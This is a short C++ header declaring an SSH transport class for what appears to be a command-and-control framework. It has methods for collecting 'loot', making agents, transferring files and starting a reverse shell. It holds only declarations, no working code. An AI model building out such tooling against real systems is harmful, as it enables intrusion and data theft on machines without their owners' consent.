#pragma once

#include "transport.h"
#include "list.h"
#include "log.h"
#include "b64.h"
#include "agents.h"

class Ssh_Transport: public ServerTransport
{
private:
    class Log *logger;
    class List *list;
    pClientNode node;
public:
    Ssh_Transport(class Log *logger, class List *list, pClientNode node);
    //Ssh_Transport(class Log *logger, class List *list, _clientNode *node);
    ~Ssh_Transport();
    int determine_handler() override;
    int upload_file(char *ptr, int is_module) override;
    int download_file(char *ptr, int is_manager, char *extra) override;
    int get_loot(char *loot) override;
    int get_info(char *ptr) override;
    int handle(void *sess) override;
    void make_agent(char *dat_ptr, char *d_ptr) override;
    int init_reverse_shell() override;
    pClientNode get_node() override;
};